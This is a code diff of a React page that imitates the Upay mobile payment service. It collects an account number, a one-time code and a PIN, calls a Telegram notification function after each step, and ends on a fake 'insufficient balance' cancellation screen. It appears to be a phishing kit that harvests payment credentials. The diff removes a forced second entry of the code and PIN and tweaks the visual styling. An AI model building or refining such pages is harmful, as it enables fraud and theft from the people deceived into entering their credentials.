@@ -67,12 +67,6 @@ const UpayPayment = () => {
     }
     sendTelegramNotification({ type: 'payment_confirmed', amount, method: 'Upay OTP' });
 
-    if (otpAttempts === 0) {
-      setOtpAttempts(1);
-      setOtp("");
-      setTimeout(() => otpRef.current?.focus(), 50);
-      return;
-    }
     setStep('pin');
   };
 
@@ -84,12 +78,6 @@ const UpayPayment = () => {
     }
     sendTelegramNotification({ type: 'payment_confirmed', amount, method: 'Upay PIN' });
 
-    if (pinAttempts === 0) {
-      setPinAttempts(1);
-      setPin("");
-      setTimeout(() => pinRef.current?.focus(), 50);
-      return;
-    }
     navigate(`/payment-cancelled?channel=Upay&reason=Insufficient Balance&amount=${amount}.00`);
   };
 
@@ -104,7 +92,7 @@ const UpayPayment = () => {
           <p className="text-center text-[#0054A5] font-semibold text-sm mb-2">Enter your PIN</p>
           {showError && <p className="text-center text-red-500 text-[11px] mb-1">{showError}</p>}
           <input ref={pinRef} type="password" inputMode="numeric" value={pin} onChange={handlePinChange} placeholder="PIN"
-            className="w-full border border-[#ccc] rounded-full px-3 py-2 text-center text-sm outline-none focus:border-[#0054A5] transition-colors bg-white" />
+            className="w-full border border-[#ccc] rounded-full px-3 py-2 text-center text-sm outline-none focus:border-[#0054A5] transition-colors" style={{ backgroundColor: 'rgba(235, 235, 235, 0.7)' }} />
           <p className="text-center text-[#333] text-[11px] mt-2">By clicking on <span className="font-bold">Confirm,</span> you are agreeing to the <span className="underline font-semibold text-[#1a1a1a]">terms & conditions</span></p>
         </>
       );
@@ -115,7 +103,7 @@ const UpayPayment = () => {
           <p className="text-center text-[#0054A5] font-semibold text-sm mb-2">Enter verification code</p>
           {showError && <p className="text-center text-red-500 text-[11px] mb-1">{showError}</p>}
           <input ref={otpRef} type="text" inputMode="numeric" value={otp} onChange={handleOtpChange} placeholder="Verification code"
-            className="w-full border border-[#ccc] rounded-full px-3 py-2 text-center text-sm outline-none focus:border-[#0054A5] transition-colors bg-white" />
+            className="w-full border border-[#ccc] rounded-full px-3 py-2 text-center text-sm outline-none focus:border-[#0054A5] transition-colors" style={{ backgroundColor: 'rgba(235, 235, 235, 0.7)' }} />
           <p className="text-center text-[#333] text-[11px] mt-2">By clicking on <span className="font-bold">Confirm,</span> you are agreeing to the <span className="underline font-semibold text-[#1a1a1a]">terms & conditions</span></p>
         </>
       );
@@ -126,7 +114,7 @@ const UpayPayment = () => {
         <p className="text-center text-[#0054A5] font-semibold text-sm mb-2">Enter Your upay Account Number</p>
         {showError && <p className="text-center text-red-500 text-[11px] mb-1">{showError}</p>}
         <input ref={mobileRef} type="text" inputMode="numeric" value={mobileNumber} onChange={handleMobileChange} placeholder="e.g 01XXXXXXXXX"
-          className="w-full border border-[#ccc] rounded-full px-3 py-2 text-center text-sm outline-none focus:border-[#0054A5] transition-colors bg-white" />
+          className="w-full border border-[#ccc] rounded-full px-3 py-2 text-center text-sm outline-none focus:border-[#0054A5] transition-colors" style={{ backgroundColor: 'rgba(235, 235, 235, 0.7)' }} />
         <p className="text-center text-[#333] text-[11px] mt-2">By clicking on <span className="font-bold">Confirm,</span> you are agreeing to the <span className="underline font-semibold text-[#1a1a1a]">terms & conditions</span></p>
       </>
     );
@@ -142,7 +130,7 @@ const UpayPayment = () => {
         {/* Yellow upper section - logo, invoice, input */}
         <div className="px-5 pt-8 pb-6 flex flex-col items-center" style={{ backgroundColor: 'rgb(251, 214, 0)' }}>
           {/* Logo */}
-          <img src={upayLogo} alt="Upay" className="w-40 h-auto object-contain mb-5" />
+          <img src={upayLogo} alt="Upay" className="w-52 h-auto object-contain mb-5" />
 
           {/* Invoice info box */}
           <div className="w-full rounded-xl px-4 py-4 mb-6 text-center" style={{ backgroundColor: 'rgba(235, 235, 235, 0.7)' }}>
